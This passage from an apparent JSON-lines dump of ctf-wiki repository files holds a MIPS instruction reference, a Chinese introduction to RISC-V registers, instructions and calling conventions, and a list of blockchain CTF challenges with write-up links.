(4); |\n| Syntax:      | blez $s, offset                                            |\n| Encoding:    | `0001 10ss sss0 0000 iiii iiii iiii iiii`                  |\n\n**BLTZ -- Branch on less than zero**\n\n| Description: | Branches if the register is less than zero                |\n| ------------ | --------------------------------------------------------- |\n| Operation:   | if $s < 0 advance_pc (offset << 2)); else advance_pc (4); |\n| Syntax:      | bltz $s, offset                                           |\n| Encoding:    | `0000 01ss sss0 0000 iiii iiii iiii iiii`                 |\n\n**BLTZAL -- Branch on less than zero and link**\n\n| Description: | Branches if the register is less than zero and saves the return address in $31 |\n| ------------ | ------------------------------------------------------------ |\n| Operation:   | if $s < 0 $31 = PC + 8 (or nPC + 4); advance_pc (offset << 2)); else advance_pc (4); |\n| Syntax:      | bltzal $s, offset                                            |\n| Encoding:    | `0000 01ss sss1 0000 iiii iiii iiii iiii`                    |\n\nBNE -- Branch on not equal\n\n| Description: | Branches if the two registers are not equal                 |\n| ------------ | ----------------------------------------------------------- |\n| Operation:   | if $s != $t advance_pc (offset << 2)); else advance_pc (4); |\n| Syntax:      | bne $s, $t, offset                                          |\n| Encoding:    | `0001 01ss ssst tttt iiii iiii iiii iiii`                   |\n\n**DIV -- Divide**\n\n| Description: | Divides $s by $t and stores the quotient in $LO and the remainder in $HI |\n| ------------ | ------------------------------------------------------------ |\n| Operation:   | $LO = $s / $t; $HI = $s % $t; advance_pc (4);                |\n| Syntax:      | div $s, $t                                                   |\n| Encoding:    | `0000 00ss ssst tttt 0000 0000 0001 1010`                    |\n\n**DIVU -- Divide unsigned**\n\n| Description: | Divides $s by $t and stores the quotient in $LO and the remainder in $HI |\n| ------------ | ------------------------------------------------------------ |\n| Operation:   | $LO = $s / $t; $HI = $s % $t; advance_pc (4);                |\n| Syntax:      | divu $s, $t                                                  |\n| Encoding:    | `0000 00ss ssst tttt 0000 0000 0001 1011`                    |\n\n**J -- Jump**\n\n| Description: | Jumps to the calculated address                     |\n| ------------ | --------------------------------------------------- |\n| Operation:   | PC = nPC; nPC = (PC & 0xf0000000) \\| (target << 2); |\n| Syntax:      | j target                                            |\n| Encoding:    | `0000 10ii iiii iiii iiii iiii iiii iiii`           |\n\n**JAL -- Jump and link**\n\n| Description: | Jumps to the calculated address and stores the return address in $31 |\n| ------------ | ------------------------------------------------------------ |\n| Operation:   | $31 = PC + 8 (or nPC + 4); PC = nPC; nPC = (PC & 0xf0000000) \\| (target << 2); |\n| Syntax:      | jal target                                                   |\n| Encoding:    | `0000 11ii iiii iiii iiii iiii iiii iiii`                    |\n\n**JR -- Jump register**\n\n| Description: | Jump to the address contained in register $s |\n| ------------ | -------------------------------------------- |\n| Operation:   | PC = nPC; nPC = $s;                          |\n| Syntax:      | jr $s                                        |\n| Encoding:    | `0000 00ss sss0 0000 0000 0000 0000 1000`    |\n\n**LB -- Load byte**\n\n| Description: | A byte is loaded into a register from the specified address. |\n| ------------ | ------------------------------------------------------------ |\n| Operation:   | $t = MEM[$s + offset]; advance_pc (4);                       |\n| Syntax:      | lb $t, offset($s)                                            |\n| Encoding:    | `1000 00ss ssst tttt iiii iiii iiii iiii`                    |\n\n**LUI -- Load upper immediate**\n\n| Description: | The immediate value is shifted left 16 bits and stored in the register. The lower 16 bits are zeroes. |\n| ------------ | ------------------------------------------------------------ |\n| Operation:   | $t = (imm << 16); advance_pc (4);                            |\n| Syntax:      | lui $t, imm                                                  |\n| Encoding:    | `0011 11-- ---t tttt iiii iiii iiii iiii`                    |\n\n**LW -- Load word**\n\n| Description: | A word is loaded into a register from the specified address. |\n| ------------ | ------------------------------------------------------------ |\n| Operation:   | $t = MEM[$s + offset]; advance_pc (4);                       |\n| Syntax:      | lw $t, offset($s)                                            |\n| Encoding:    | `1000 11ss ssst tttt iiii iiii iiii iiii`                    |\n\n**MFHI -- Move from HI**\n\n| Description: | The contents of register HI are moved to the specified register. |\n| ------------ | ------------------------------------------------------------ |\n| Operation:   | $d = $HI; advance_pc (4);                                    |\n| Syntax:      | mfhi $d                                                      |\n| Encoding:    | `0000 0000 0000 0000 dddd d000 0001 0000`                    |\n\n**MFLO -- Move from LO**\n\n| Description: | The contents of register LO are moved to the specified register. |\n| ------------ | ------------------------------------------------------------ |\n| Operation:   | $d = $LO; advance_pc (4);                                    |\n| Syntax:      | mflo $d                                                      |\n| Encoding:    | `0000 0000 0000 0000 dddd d000 0001 0010`                    |\n\n**MULT -- Multiply**\n\n| Description: | Multiplies $s by $t and stores the result in $LO. |\n| ------------ | ------------------------------------------------- |\n| Operation:   | $LO = $s * $t; advance_pc (4);                    |\n| Syntax:      | mult $s, $t                                       |\n| Encoding:    | `0000 00ss ssst tttt 0000 0000 0001 1000`         |\n\n**MULTU -- Multiply unsigned**\n\n| Description: | Multiplies $s by $t and stores the result in $LO. |\n| ------------ | ------------------------------------------------- |\n| Operation:   | $LO = $s * $t; advance_pc (4);                    |\n| Syntax:      | multu $s, $t                                      |\n| Encoding:    | `0000 00ss ssst tttt 0000 0000 0001 1001`         |\n\n**NOOP -- no operation**\n\n| Description: | Performs no operation.                    |\n| ------------ | ----------------------------------------- |\n| Operation:   | advance_pc (4);                           |\n| Syntax:      | noop                                      |\n| Encoding:    | `0000 0000 0000 0000 0000 0000 0000 0000` |\n\n\nNote: The encoding for a NOOP represents the instruction SLL $0, $0, 0 which has no side effects. In fact, nearly every instruction that has $0 as its destination register will have no side effect and can thus be considered a NOOP instruction.\n\n **OR -- Bitwise or**\n\n| Description: | Bitwise logical ors two registers and stores the result in a register |\n| ------------ | ------------------------------------------------------------ |\n| Operation:   | $d = $s \\| $t; advance_pc (4);                               |\n| Syntax:      | or $d, $s, $t                                                |\n| Encoding:    | `0000 00ss ssst tttt dddd d000 0010 0101`                    |\n\n**ORI -- Bitwise or immediate**\n\n| Description: | Bitwise ors a register and an immediate value and stores the result in a register |\n| ------------ | ------------------------------------------------------------ |\n| Operation:   | $t = $s \\| imm; advance_pc (4);                              |\n| Syntax:      | ori $t, $s, imm                                              |\n| Encoding:    | `0011 01ss ssst tttt iiii iiii iiii iiii`                    |\n\n**SB -- Store byte**\n\n| Description: | The least significant byte of $t is stored at the specified address. |\n| ------------ | ------------------------------------------------------------ |\n| Operation:   | MEM[$s + offset] = (0xff & $t); advance_pc (4);              |\n| Syntax:      | sb $t, offset($s)                                            |\n| Encoding:    | `1010 00ss ssst tttt iiii iiii iiii iiii`                    |\n\n**SLL -- Shift left logical**\n\n| Description: | Shifts a register value left by the shift amount listed in the instruction and places the result in a third register. Zeroes are shifted in. |\n| ------------ | ------------------------------------------------------------ |\n| Operation:   | $d = $t << h; advance_pc (4);                                |\n| Syntax:      | sll $d, $t, h                                                |\n| Encoding:    | `0000 00ss ssst tttt dddd dhhh hh00 0000`                    |\n\n**SLLV -- Shift left logical variable**\n\n| Description: | Shifts a register value left by the value in a second register and places the result in a third register. Zeroes are shifted in. |\n| ------------ | ------------------------------------------------------------ |\n| Operation:   | $d = $t << $s; advance_pc (4);                               |\n| Syntax:      | sllv $d, $t, $s                                              |\n| Encoding:    | `0000 00ss ssst tttt dddd d--- --00 0100`                    |\n\n**SLT -- Set on less than (signed)**\n\n| Description: | If $s is less than $t, $d is set to one. It gets zero otherwise. |\n| ------------ | ------------------------------------------------------------ |\n| Operation:   | if $s < $t $d = 1; advance_pc (4); else $d = 0; advance_pc (4); |\n| Syntax:      | slt $d, $s, $t                                               |\n| Encoding:    | `0000 00ss ssst tttt dddd d000 0010 1010`                    |\n\n**SLTI -- Set on less than immediate (signed)**\n\n| Description: | If $s is less than immediate, $t is set to one. It gets zero otherwise. |\n| ------------ | ------------------------------------------------------------ |\n| Operation:   | if $s < imm $t = 1; advance_pc (4); else $t = 0; advance_pc (4); |\n| Syntax:      | slti $t, $s, imm                                             |\n| Encoding:    | `0010 10ss ssst tttt iiii iiii iiii iiii`                    |\n\n**SLTIU -- Set on less than immediate unsigned**\n\n| Description: | If $s is less than the unsigned immediate, $t is set to one. It gets zero otherwise. |\n| ------------ | ------------------------------------------------------------ |\n| Operation:   | if $s < imm $t = 1; advance_pc (4); else $t = 0; advance_pc (4); |\n| Syntax:      | sltiu $t, $s, imm                                            |\n| Encoding:    | `0010 11ss ssst tttt iiii iiii iiii iiii`                    |\n\n**SLTU -- Set on less than unsigned**\n\n| Description: | If $s is less than $t, $d is set to one. It gets zero otherwise. |\n| ------------ | ------------------------------------------------------------ |\n| Operation:   | if $s < $t $d = 1; advance_pc (4); else $d = 0; advance_pc (4); |\n| Syntax:      | sltu $d, $s, $t                                              |\n| Encoding:    | `0000 00ss ssst tttt dddd d000 0010 1011`                    |\n\n**SRA -- Shift right arithmetic**\n\n| Description: | Shifts a register value right by the shift amount (shamt) and places the value in the destination register. The sign bit is shifted in. |\n| ------------ | ------------------------------------------------------------ |\n| Operation:   | $d = $t >> h; advance_pc (4);                                |\n| Syntax:      | sra $d, $t, h                                                |\n| Encoding:    | `0000 00-- ---t tttt dddd dhhh hh00 0011`                    |\n\n**SRL -- Shift right logical**\n\n| Description: | Shifts a register value right by the shift amount (shamt) and places the value in the destination register. Zeroes are shifted in. |\n| ------------ | ------------------------------------------------------------ |\n| Operation:   | $d = $t >> h; advance_pc (4);                                |\n| Syntax:      | srl $d, $t, h                                                |\n| Encoding:    | `0000 00-- ---t tttt dddd dhhh hh00 0010`                    |\n\n**SRLV -- Shift right logical variable**\n\n| Description: | Shifts a register value right by the amount specified in $s and places the value in the destination register. Zeroes are shifted in. |\n| ------------ | ------------------------------------------------------------ |\n| Operation:   | $d = $t >> $s; advance_pc (4);                               |\n| Syntax:      | srlv $d, $t, $s                                              |\n| Encoding:    | `0000 00ss ssst tttt dddd d000 0000 0110`                    |\n\n**SUB -- Subtract**\n\n| Description: | Subtracts two registers and stores the result in a register |\n| ------------ | ----------------------------------------------------------- |\n| Operation:   | $d = $s - $t; advance_pc (4);                               |\n| Syntax:      | sub $d, $s, $t                                              |\n| Encoding:    | `0000 00ss ssst tttt dddd d000 0010 0010`                   |\n\n**SUBU -- Subtract unsigned**\n\n| Description: | Subtracts two registers and stores the result in a register |\n| ------------ | ----------------------------------------------------------- |\n| Operation:   | $d = $s - $t; advance_pc (4);                               |\n| Syntax:      | subu $d, $s, $t                                             |\n| Encoding:    | `0000 00ss ssst tttt dddd d000 0010 0011`                   |\n\n**SW -- Store word**\n\n| Description: | The contents of $t is stored at the specified address. |\n| ------------ | ------------------------------------------------------ |\n| Operation:   | MEM[$s + offset] = $t; advance_pc (4);                 |\n| Syntax:      | sw $t, offset($s)                                      |\n| Encoding:    | `1010 11ss ssst tttt iiii iiii iiii iiii`              |\n\n**SYSCALL -- System call**\n\n| Description: | Generates a software interrupt.           |\n| ------------ | ----------------------------------------- |\n| Operation:   | advance_pc (4);                           |\n| Syntax:      | syscall                                   |\n| Encoding:    | `0000 00-- ---- ---- ---- ---- --00 1100` |\n\n\n\n\n**XOR -- Bitwise exclusive or**\n\n| Description: | Exclusive ors two registers and stores the result in a register |\n| ------------ | ------------------------------------------------------------ |\n| Operation:   | $d = $s ^ $t; advance_pc (4);                                |\n| Syntax:      | xor $d, $s, $t                                               |\n| Encoding:    | `0000 00ss ssst tttt dddd d--- --10 0110`                    |\n\n**XORI -- Bitwise exclusive or immediate**\n\n| Description: | Bitwise exclusive ors a register and an immediate value and stores the result in a register |\n| ------------ | ------------------------------------------------------------ |\n| Operation:   | $t = $s ^ imm; advance_pc (4);                               |\n| Syntax:      | xori $t, $s, imm                                             |\n| Encoding:    | `0011 10ss ssst tttt iiii iiii iiii iiii`                    |\n\n## 参考链接\n\n[MIPS Instruction Reference](http://www.mrc.uidaho.edu/mrc/people/jff/digital/MIPSir.html)\n", "timestamp": "2025-10-21T22:02:40.378078"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/assembly/risc-v/readme.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/assembly/risc-v/readme.md", "content": "# Risc-V\n\n介绍 Risc-V 基础内容。\n\n## 0x01 架构特点\n\nRISC-V 是一种新兴的开放指令集架构（ISA），具有高度的灵活性和可扩展性。它以模块化设计为核心理念，允许开发者根据实际需求选择不同的扩展模块来构建处理器。例如，最基本的指令集包括 RV32I 和 RV64I，而可选的扩展则覆盖了乘除法（M）、原子操作（A）、浮点运算（F、D）、压缩指令（C）以及适用于高性能计算的向量指令集（V）等。\n\n该架构支持多种位宽，包括 32 位（RV32）、64 位（RV64）以及未来预留的 128 位（RV128）模式，从而满足从嵌入式系统到高性能服务器等多样化应用场景。RISC-V 还明确区分了处理器的特权级别，定义了用户态（U-mode）、监督态（S-mode）和机器态（M-mode），为操作系统的运行和安全机制提供了良好的支撑。\n\n以下表格列出了一些常见的指令集扩展及其简要说明：\n\n| 名称             | 描述                                 |\n|------------------|--------------------------------------|\n| RV32I / RV64I     | 基础整数指令集，构建最小系统的核心   |\n| M 扩展           | 支持整数乘除法运算                   |\n| A 扩展           | 提供原子操作能力，适用于多核系统     |\n| F / D 扩展       | 支持浮点数运算：F 为单精度，D 为双精度 |\n| C 扩展           | 16 位压缩指令，提升代码密度           |\n| V 扩展           | 向量处理能力，用于数据并行计算       |\n| Zicsr / Zifencei | 控制状态寄存器操作与指令同步控制     |\n\n## 0x02 寄存器\n\nRISC-V 处理器架构定义了一组通用寄存器和控制状态寄存器（CSR），用于处理数据、控制流程以及存储状态信息。以下是对这两类寄存器的简要介绍。\n\n### （1）通用寄存器\n\nRISC-V 一共有 **32 个通用寄存器**，编号为 `x0` 到 `x31`，每个寄存器为 32 位（RV32）或 64 位（RV64）。这些寄存器也有对应的 ABI 名称，常用于汇编语言编程。\n\n| 寄存器编号 | ABI 名称 | 用途说明            |\n|------------|----------|---------------------|\n| x0         | zero     | 恒为 0 的只读寄存器 |\n| x1         | ra       | 返回地址寄存器      |\n| x2         | sp       | 栈指针               |\n| x3         | gp       | 全局指针             |\n| x4         | tp       | 线程指针             |\n| x5-x7      | t0-t2    | 临时寄存器           |\n| x8         | s0/fp    | 保存寄存器/帧指针    |\n| x9         | s1       | 保存寄存器           |\n| x10-x17    | a0-a7    | 函数参数/返回值      |\n| x18-x27    | s2-s11   | 保存寄存器           |\n| x28-x31    | t3-t6    | 临时寄存器           |\n\n注意事项：\n- `x0` 是特殊的，只读寄存器，总是返回 `0`，写入无效。\n- 临时寄存器（`t0`~`t6`）在函数调用过程中不保证保留。\n- 保存寄存器（`s0`~`s11`）在函数调用之间必须被保存和恢复。\n\n### （2）CSR 寄存器\n\nCSR（Control and Status Register）是用于控制、状态监测和配置处理器运行的重要寄存器。RISC-V 中 CSR 的地址空间为 12 位，共支持 4096 个 CSR 寄存器。\n\n常见的 CSR 寄存器包括：\n\n| 名称        | 地址      | 功能说明                               |\n|-------------|-----------|----------------------------------------|\n| `mstatus`   | 0x300     | 机器级状态寄存器，保存全局中断使能、特权级等信息 |\n| `misa`      | 0x301     | 指示当前支持的指令集架构               |\n| `mie`       | 0x304     | 中断使能寄存器                         |\n| `mtvec`     | 0x305     | 中断向量表地址                         |\n| `mepc`      | 0x341     | 异常发生时的程序计数器保存寄存器       |\n| `mcause`    | 0x342     | 异常/中断原因寄存器                    |\n| `mtval`     | 0x343     | 出错地址信息                           |\n| `mcycle`    | 0xB00     | 机器模式下的周期计数器                 |\n\n注意事项：\n- CSR 可通过特殊隶属 `zicsr` 扩展指令集的指令 `csrrw`、`csrrs`、`csrrc` 等进行读写。\n- 按照特权级别分类，CSR 分为用户态（u*）、监督态（s*）、机器态（m*）等。\n- 在简化实现中，仅支持机器态（M-mode）的 CSR 是常见情况。\n\n### （3）浮点寄存器\n\nRISC-V 架构在支持浮点扩展（如 `F` 和 `D` 扩展）时，提供了一组专用的浮点寄存器，用于浮点数的计算和数据存储。\n\nRISC-V 定义了 **32 个浮点寄存器**，编号为 `f0` 到 `f31`，每个寄存器通常为 32 位（单精度，RV32F）或 64 位（双精度，RV64D），具体取决于所实现的浮点扩展。\n\n| 寄存器编号 | ABI 名称 | 用途说明            |\n|------------|----------|---------------------|\n| f0-f7      | ft0-ft7  | 临时寄存器          |\n| f8-f9      | fs0-fs1  | 保存寄存器          |\n| f10-f17    | fa0-fa7  | 函数参数/返回值     |\n| f18-f27    | fs2-fs11 | 保存寄存器          |\n| f28-f31    | ft8-ft11 | 临时寄存器          |\n\n注意事项：\n- 浮点寄存器的 ABI 命名与整数寄存器类似，但前缀为 `f`。\n- 根据 ABI 约定，函数参数通过 `fa0`~`fa7` 传递，返回值通常使用 `fa0`。\n- `ft*` 为调用者保存（Caller-saved），`fs*` 为被调用者保存（Callee-saved）。\n- 使用浮点寄存器需要处理器支持相应的浮点扩展指令集，如 `F`（单精度）或 `D`（双精度）。\n\n## 0x03 常见指令\n\n### （1）常见整数指令（R 型）\n\nR 型指令用于寄存器之间的算术或逻辑操作，格式：`rd = rs1 op rs2`。\n\n| 指令   | 含义            | 示例              | 说明                      |\n|--------|-----------------|-------------------|---------------------------|\n| `add`  | 加法             | `add x5, x1, x2`  | `x5 = x1 + x2`            |\n| `sub`  | 减法             | `sub x5, x1, x2`  | `x5 = x1 - x2`            |\n| `sll`  | 逻辑左移         | `sll x5, x1, x2`  | 按 `x2` 位左移 `x1`        |\n| `srl`  | 逻辑右移         | `srl x5, x1, x2`  | 按 `x2` 位右移 `x1`        |\n| `sra`  | 算术右移         | `sra x5, x1, x2`  | 保留符号位的右移           |\n| `and`  | 位与             | `and x5, x1, x2`  | 位级 `AND` 运算           |\n| `or`   | 位或             | `or x5, x1, x2`   | 位级 `OR` 运算            |\n| `xor`  | 位异或           | `xor x5, x1, x2`  | 位级 `XOR` 运算           |\n| `slt`  | 小于置位（有符号）| `slt x5, x1, x2`  | 若 `x1 < x2`，`x5=1` 否则为 0 |\n| `sltu` | 小于置位（无符号）| `sltu x5, x1, x2` | 同上但比较无符号值         |\n\n---\n\n### （2）常见立即数指令（I 型）\n\nI 型指令对寄存器和立即数执行运算，适用于快速计算和常数赋值。\n\n| 指令     | 含义           | 示例               | 说明                            |\n|----------|----------------|--------------------|---------------------------------|\n| `addi`   | 加立即数        | `addi x5, x1, 10`  | `x5 = x1 + 10`                  |\n| `andi`   | 与立即数        | `andi x5, x1, 0xF` | 位级 `AND`，掩码操作常用        |\n| `ori`    | 或立即数        | `ori x5, x1, 1`    | 设置某一位常用                  |\n| `xori`   | 异或立即数      | `xori x5, x1, 0x1` | 反转特定位                      |\n| `slti`   | 小于立即数      | `slti x5, x1, 5`   | 有符号立即数比较                |\n| `sltiu`  | 无符号小于立即数| `sltiu x5, x1, 5`  | 无符号立即数比较                |\n| `slli`   | 左移立即数      | `slli x5, x1, 3`   | 最多移位 31（RV32）             |\n| `srli`   | 右移立即数      | `srli x5, x1, 2`   | 无符号逻辑右移                  |\n| `srai`   | 算术右移立即数  | `srai x5, x1, 2`   | 有符号右移保留符号位            |\n| `lui`    | 加载高位立即数  | `lui x5, 0x12345`  | `x5 = 0x12345000`               |\n| `auipc`  | 加偏移到 PC     | `auipc x5, 0x10`   | `x5 = PC + 0x10000`             |\n\n---\n\n### （3）加载指令（I 形）\n\n用于从内存地址读取数据到寄存器。地址由 `rs1 + offset` 计算得出。\n\n| 指令   | 含义                 | 示例                   | 说明                           |\n|--------|----------------------|------------------------|--------------------------------|\n| `lb`   | 加载字节（有符号）    | `lb x5, 0(x1)`         | 从 `x1` 指向的地址读 1 字节，符号扩展到 `x5` |\n| `lbu`  | 加载字节（无符号）    | `lbu x5, 0(x1)`        | 零扩展                         |\n| `lh`   | 加载半字（16 位）     | `lh x5, 2(x1)`         | 符号扩展 16 位整数             |\n| `lhu`  | 加载半字（无符号）    | `lhu x5, 2(x1)`        | 零扩展                         |\n| `lw`   | 加载字（32 位）       | `lw x5, 4(x1)`         | 常用加载指令                   |\n| `lwu`  | 加载字（无符号，RV64）| `lwu x5, 4(x1)`        | 32 位零扩展用于 RV64           |\n| `ld`   | 加载双字（64 位）     | `ld x5, 8(x1)`         | RV64 架构下的主力指令           |\n\n### （4）存储指令（S 型）\n\n用于将寄存器中的值写入内存中。地址仍由 `rs1 + offset` 计算。\n\n| 指令   | 含义               | 示例                   | 说明                       |\n|--------|--------------------|------------------------|----------------------------|\n| `sb`   | 存储字节           | `sb x5, 0(x1)`         | 仅存 1 字节                |\n| `sh`   | 存储半字（16 位）  | `sh x5, 2(x1)`         |                            |\n| `sw`   | 存储字（32 位）    | `sw x5, 4(x1)`         | RV32 和 RV64 共用          |\n| `sd`   | 存储双字（64 位）  | `sd x5, 8(x1)`         | 仅 RV64 可用               |\n\n---\n\n### （5）控制流指令（B 型）\n\n用于实现条件跳转，配合标签使用，跳转偏移为 12 位立即数（±4KB）。\n\n| 指令   | 含义                     | 示例                  | 说明                            |\n|--------|--------------------------|-----------------------|---------------------------------|\n| `beq`  | 相等跳转                  | `beq x1, x2, label`   | 若 `x1 == x2`，跳转到 `label`   |\n| `bne`  | 不等跳转                  | `bne x1, x2, label`   | 若 `x1 != x2`，跳转             |\n| `blt`  | 小于跳转（有符号）        | `blt x1, x2, label`   | 若 `x1 < x2`，跳转              |\n| `bge`  | 大于等于跳转（有符号）    | `bge x1, x2, label`   | 若 `x1 >= x2`，跳转             |\n| `bltu` | 小于跳转（无符号）        | `bltu x1, x2, label`  | 无符号小于比较跳转             |\n| `bgeu` | 大于等于跳转（无符号）    | `bgeu x1, x2, label`  | 无符号大于等于比较跳转         |\n\n---\n\n### （6）跳转与链接指令（J 型、I 型）\n\n用于过程调用和函数跳转，保留返回地址到 `ra`。\n\n| 指令   | 含义           | 示例                 | 说明                                |\n|--------|----------------|----------------------|-------------------------------------|\n| `jal`  | 跳转并链接（J 型）| `jal x1, label`      | `x1 = PC+4; PC = label`（用于调用） |\n| `jalr` | 寄存器间接跳转（I 型）| `jalr x1, x2, 0`    | `x1 = PC+4; PC = x2 + 0`（常返回，调用函数指针）|\n\n- 若目标寄存器为 `x0`，表示**不保存返回地址**（纯跳转）。\n- `jal` 通常用于调用函数，`jalr` 用于从函数返回。\n\n---\n\n### （7）特殊系统调用指令（环境交互）\n\n| 指令     | 含义                    | 示例                       | 说明                             |\n|----------|-------------------------|----------------------------|----------------------------------|\n| `ecall`  | 环境调用（系统调用）     | `ecall`                    | 触发环境调用异常          |\n| `ebreak` | 调试断点                 | `ebreak`                   | 触发调试异常                       |\n\n## 0x04 调用规约\n\n栈帧结构图（RISC-V ABI 栈帧）\n\n```text\n高地址\n│\n│  +-----------------------------+\n│  | 需要保存的寄存器             |\n│  +-----------------------------+\n│  | 超过寄存器传参的参数 > a7/fa7 |\n│  +-----------------------------+\n│  | 返回地址 (ra)                │\n│  +-----------------------------+\n│  | 局部变量                     |\n│  +-----------------------------+\n│  | (16 字节对齐空间填充)        |\n└──► 栈指针 (sp)\n```\n\n### 1. **栈增长**\n- **向低地址方向增长**\n- `sp`（x2）总是保持 **16 字节对齐**\n- 常用 `sp` 为指针访问栈的内容（例如: `ld t0, 16(sp)`）\n\n### 2. **保存寄存器内容**\n由 **callee** 保存：\n- `s0–s11`（x8–x9, x18–x27） → 用于长期保存的数据\n- `fs0–fs11`（f8–f9, f18–f27） → 浮点保存寄存器\n- `ra`（x1） → 返回地址（call伪指令修改ra后由被调用函数保存）\n\n由 **caller** 保存：\n- `t0–t6`（x5–x7, x28–x31）\n- `ft0–ft11`（f0–f7, f28–f31）\n\n### 参数大小约束\n- 小于指针大小（如 `char`、`short`）：放在寄存器的低位\n- 超过一个指针大小（如 `long long`）：需要偶数对齐寄存器\n  - 例如 RV32 中：\n    ```c\n    void foo(int, long long)\n    ```\n    - `int` → `a0`\n    - `long long` → `a2` 和 `a3`（跳过 `a1`，偶数对齐）\n\n- 超过两个指针大小（如 `struct { long x[3]; }`） → **按引用传递**\n\n### 返回值传递规则\n\n- 返回值使用：\n  - 整数：`a0`, `a1`\n  - 浮点数：`fa0`, `fa1`\n- 结构体返回：\n  - ≤2 pointer-word：用 `a0/a1`\n  - >2 pointer-word：**调用者分配内存**，并通过**隐藏指针作为第一个参数**传递\n\n### 寄存器使用一览\n\n| 类型           | 名称       | 用途                         | 由谁保存        |\n|----------------|------------|------------------------------|-----------------|\n| x1             | ra         | 返回地址                     | 调用者（caller）|\n| x2             | sp         | 栈指针                       | 被调用者（callee）|\n| x8             | s0 / fp    | 帧指针 / 保存寄存器         | 被调用者        |\n| x10–x17        | a0–a7      | 参数 / 返回值寄存器          | 调用者          |\n| x5–x7, x28–x31 | t0–t6      | 临时变量                     | 调用者          |\n| x9, x18–x27    | s1, s2–11  | 保存变量                     | 被调用者        |\n| f10–f17        | fa0–fa7    | 浮点参数 / 返回值            | 调用者          |\n| f0–f7, f28–f31 | ft0–11     | 浮点临时变量                 | 调用者          |\n| f8–f9, f18–f27 | fs0–fs11   | 浮点保存变量                 | 被调用者        |\n\n> 注意 `sp`, `ra` 寄存器严格来说不属于 **草稿/保留** 寄存器分类，对这两个寄存器的处理多以callee保存为实现。与此同时还有 `gp` 等寄存器不属于这个范畴。\n\n## 参阅\n\n- [RISC-V ELF psABI 文件（riscv-non-isa/riscv-elf-psabi-doc）](https://github.com/riscv-non-isa/riscv-elf-psabi-doc)  \n- [RISC-V 指令集架构官方手册（riscv/riscv-isa-manual）](https://github.com/riscv/riscv-isa-manual)  ", "timestamp": "2025-10-21T22:02:40.620377"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/blockchain/challenges.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/blockchain/challenges.md", "content": "# Blockchain Security Challenges\n\n## Game of Ethereum Smart Contract Security\n\n- [https://ethernaut.openzeppelin.com/](https://ethernaut.openzeppelin.com/)\n    + WP 链接 [https://hitcxy.com/2019/ethernaut/](https://hitcxy.com/2019/ethernaut/)\n- [https://capturetheether.com/challenges/](https://capturetheether.com/challenges/)\n    + WP 链接 [WP1 传送门](https://www.anquanke.com/post/id/153375) [WP2 传送门](https://www.anquanke.com/post/id/154104)\n- [https://blockchain-ctf.securityinnovation.com/#/](https://blockchain-ctf.securityinnovation.com/#/)\n    + WP 链接 [https://hitcxy.com/2020/securityinnovation/](https://hitcxy.com/2020/securityinnovation/)\n- [https://www.damnvulnerabledefi.xyz/](https://www.damnvulnerabledefi.xyz/) \n    + WP 链接 [https://blog.syang.xyz/2021/03/damn-vulnerable-defi-writeup/](https://blog.syang.xyz/2021/03/damn-vulnerable-defi-writeup/)\n\n## Blockchain Security CTF Competitions\n\n- [Paradigm CTF](https://ctf.paradigm.xyz/) - 2021\n    + [Official Challenges and Solutions](https://github.com/paradigm-operations/paradigm-ctf-2021)\n\n\n## Blockchain Security Challenges in CTF\n\n!!! note \n    注：CTF 中区块链的题目并不是很多，所以搜集了绝大多数的题目，包括智能合约与公有链相关题目，并按照年份附上题目链接及其 WP 链接，题目列表不完整会随时更新，同一年中比赛名称不区分顺序，如果有多篇 WP，也不区分顺序。相关题目可到 [ctf-challenges/blockchain](https://github.com/ctf-wiki/ctf-challenges/tree/master/blockchain) 仓库查找或在 [ChainFlag](https://chainflag.org/) 靶场在线练习。\n\n### Ethereum Smart Contract\n\n- RealWorld - 2021\n    + 题目名称 Re: Montagy\n    + 题目名称 EasyDefi\n\n- *ctf - 2021\n    + 题目名称 StArNDBOX\n\n- 高校战“疫”网络安全分享赛 - 2020\n    + 题目名称 OwnerMoney\n\n- RCTF - 2020\n    + 题目名称 roiscoin\n\n- 第五空间 - 2020\n    + 题目名称 CreativityPlus\n    + 题目名称 SafeDelegatecall\n\n- 第一届钓鱼城杯 - 2020\n    + 题目名称 StrictMathematician\n\n- QWB - 2020\n    + 题目名称 IPFS\n    + 题目名称 EasyAssembly\n    + 题目名称 EasyFake\n    + 题目名称 EasySandbox\n    + 题目名称 EthGaMe (EGM)\n    + 题目名称 EBK\n\n- Balsn - 2020\n    + 题目名称 Election\n    + 题目名称 IdleGame\n\n- 华为云安全 - 2020\n    + 题目名称 ethenc\n\n- 华为鲲鹏计算 - 2020\n    + 题目名称 boxgame\n\n- 华为鸿蒙 - 2020\n    + 题目名称 ContractGame\n\n- RealWorld - 2019\n    + 题目名称 Montagy\n\n- Balsn - 2019\n    + 题目名称 Bank\n    + 题目名称 Creativity\n\n- CISCN - 2019\n    + 题目名称 Daysbank\n\n- QWB - 2019\n    + 题目名称 babybank\n    + 题目名称 babybet\n\n- ByteCTF - 2019\n    + 题目名称 bet\n    + 题目名称 hf\n\n- N1CTF - 2019\n    + 题目名称 h4ck\n\n- 数字经济 - 2019\n    + 题目名称 cow\n    + 题目名称 rise\n    + 题目名称 jojo\n\n- RoarCTF - 2019\n    + 题目名称 CoinFlip\n\n- Hackergame - 2019\n    + 题目名称 JCBank\n\n- XCTF_final - 2019\n    + 题目名称 Happy_DOuble_Eleven\n\n- D^3CTF - 2019\n    + 题目名称 bet2loss_v2\n\n- De1CTF - 2019\n    + 题目名称 Easy EOS\n\n- RealWorld - 2018\n    + 题目名称 Acoraida Monica\n\n- HCTF - 2018\n    + 题目名称 ethre\n    + 题目名称 bet2loss\n    + 题目名称 ez2win\n\n- BCTF - 2018\n    + 题目名称 Fake3d\n    + 题目名称 EOSGAME\n\n- WCTF - 2018\n    + 题目名称 BelluminarBank\n\n- LCTF - 2018\n    + 题目名称 easy little trick\n    + 题目名称 ggbank\n\n- *ctf - 2018\n    + 题目名称 web-smart_contract\n\n- dctf - 2017\n    + 题目名称 spock-lizard-alpha\n    + 题目名称 spock-lizard-beta\n    + 题目名称 spock-lizard-omega\n\n### Public Blockchain\n\n- RealWorld - 2021\n    + 题目名称 [Billboard](https://github.com/iczc/billboard)\n\n- DDCTF - 2018\n    + 题目名称 [mini 